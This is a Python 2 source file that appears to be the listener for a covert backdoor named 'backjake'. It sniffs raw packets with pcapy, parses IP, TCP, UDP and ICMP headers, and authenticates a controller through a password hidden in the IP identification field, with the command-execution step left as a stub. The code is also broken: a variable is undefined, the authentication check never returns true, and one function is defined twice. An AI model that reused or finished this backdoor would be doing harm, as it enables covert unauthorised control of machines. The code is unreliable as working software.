import socket
from struct import *
import sys
import threading
import pcapy
import config
import backjake
import utils

def endProgram():
	print "endProgram"


def recieveDatagram():
	cap = pcapy.open_live(config.dev, 65536, 1, 0)
	cap.setfilter(config.protocol)

	while(backjake.running):
		(header, packet) = cap.next()
		packetHandler(packet)

def startServer():
	listenThread = threading.Thread(target=recieveDatagram)
	listenThread.daemon = True
	listenThread.start()
	print "Listen thread start!"

def packetHandler(packet):
	if (authenticated(packet)):
		proto = checkType(packet)
		ip, protoH, data = stripPacket(packet, proto)

		# run command
	# else
		# attempt to authenticate

def stripPacket(packet, proto):
	ipLength = 20
	udpLength = 8
	icmpLength = 4
	
	ip = packet[ethLength:ipLength+ethLength]  # start from after ethernet, go 20 characters
	ipHeader = unpack('!BBHHHBBH4s4s', ip)

	if proto == 'tcp':
		tcp  = packet[ipLength+ethLength:ipLength+ethLength+20] # start from after tcp, go 20 characters
		tcpHeader = unpack('!HHLLBBHHH', tcp)
		temp = tcpHeader[4]
		tcpLength = temp >> 4		
		data = packet[ipLength+ethLength+tcpLength*4:]
		return ipHeader, tcpHeader, data
	elif proto == 'udp':
		udp = packet[ipLength+ethLength:ipLength+ethLength+udpLength]
		udpHeader = unpack('!HHHH', udp)
		data = packet[ipLength+ethLength+udpLength:]
		return ipHeader, udpHeader, data
	elif proto == 'icmp':
		icmp = packet[ipLength+ethLength:ipLength+ethLength+icmpLength]
		icmpHeader = unpack('!BBH', icmp)
		data = packet[ipLength+ethLength+icmpLength:]
		return ipHeader, icmpHeader, data

def checkType(packet):
	ethLength = 14
	ipLength = 20
	ip = packet[ethLength:ipLength+ethLength]
	ipHeader = unpack('!BBHHHBBH4s4s', ip)
	protocol = ipHeader[6]
    
	if protocol == 6:
		return 'tcp'
	elif protocol == 1:
		return 'icmp'
	elif protocol == 17:
		return 'udp'

def authenticated(packet):	
	ethLength = 14
	ipLength = 20
	ip = packet[ethLength:ipLength+ethLength]
	ipHeader = unpack('!BBHHHBBH4s4s' , ip)
	ipIdent = ipHeader[3]

	# check ip identification field for encrypted password
 	if ipIdent == utils.encrypt(config.password):
 		print "auth!"

def executeCommand():
	print "executeCommand"


def endProgram():
	print "endProgram"

